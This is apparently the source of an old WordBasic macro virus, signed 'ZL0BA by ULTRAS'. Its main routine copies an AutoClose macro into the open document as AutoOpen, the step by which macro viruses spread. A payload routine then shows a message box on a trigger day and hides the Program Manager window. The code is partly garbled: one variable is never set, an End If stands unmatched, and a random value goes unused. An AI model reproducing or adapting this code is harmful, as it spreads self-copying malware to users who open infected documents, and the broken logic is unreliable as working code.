Sub Main

uCkAo$ = FileName$() + ":AutoOpen"
uCkAc$ = "AutoClose"

MacroCopy uCkAc$, uCkAo$

Payload
End Sub
Sub Payload

If Day(Now()) = U Then
MsgBox("ZL0BA by ULTRAS"),("UCK"), 16

End If
G = Int(Rnd() * 6) + 1

AppHide("Program Manager")
End If
End Sub
